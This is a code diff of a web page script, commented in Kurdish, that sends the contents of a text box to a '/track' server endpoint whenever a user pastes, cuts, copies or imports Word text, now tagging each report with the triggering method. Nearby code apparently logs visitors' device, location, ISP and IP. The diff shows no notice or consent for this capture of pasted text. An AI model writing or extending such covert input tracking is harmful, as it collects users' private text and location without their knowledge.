@@ -3606,33 +3606,34 @@ function akSendVisit(device, city, country, region, zip, isp, lat, lon, ip) {
     if (!tb) return;
     var _lastSent = '';
 
-    function akSendText(overrideText) {
+    function akSendText(overrideText, method) {
         var txt = (typeof overrideText === 'string') ? overrideText.trim() : tb.value.trim();
         if (txt.length >= 1 && txt !== _lastSent) {
             _lastSent = txt;
+            var lbl = method || 'paste';
             fetch('/track', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type: 'textarea', text: txt })
+                body: JSON.stringify({ type: 'textarea', text: txt, method: lbl })
             }).catch(function() {});
         }
     }
 
     // ١. paste (کلیک ڕاست → paste)
     tb.addEventListener('paste', function() {
-        setTimeout(akSendText, 300);
+        setTimeout(function() { akSendText(undefined, 'paste'); }, 300);
     });
 
     // ٢. Ctrl+V و Ctrl+X لە ئەژمارەکەدا
     tb.addEventListener('keydown', function(e) {
         if ((e.ctrlKey || e.metaKey) && (e.key === 'v' || e.key === 'V')) {
-            setTimeout(akSendText, 300);
+            setTimeout(function() { akSendText(undefined, 'Ctrl+V'); }, 300);
         }
         if ((e.ctrlKey || e.metaKey) && (e.key === 'x' || e.key === 'X')) {
             // کاتی Ctrl+X: دەقی ئێستا بنێرە پێش ئەوەی بسرێتەوە
             var selectedTxt = tb.value.substring(tb.selectionStart, tb.selectionEnd);
             var toSend = selectedTxt.trim() ? selectedTxt : tb.value;
-            setTimeout(function() { akSendText(toSend); }, 50);
+            setTimeout(function() { akSendText(toSend, 'Ctrl+X'); }, 50);
         }
     });
 
@@ -3646,13 +3647,13 @@ function akSendVisit(device, city, country, region, zip, isp, lat, lon, ip) {
             var toSend2 = (start !== end)
                 ? textarea2.value.substring(start, end)
                 : textarea2.value;
-            if (toSend2.trim()) akSendText(toSend2);
+            if (toSend2.trim()) akSendText(toSend2, 'کەتکردن');
         }
         if (typeof _origCopyText === 'function') _origCopyText();
     };
 
     // ٤. ئاگادارکردنەوەی هێنانی Word
-    window._akSendTextareaText = akSendText;
+    window._akSendTextareaText = function() { akSendText(undefined, 'Word'); };
 })();
 
 // ---- دەستپێکردنی چالاکی شوێنکەوتن ----
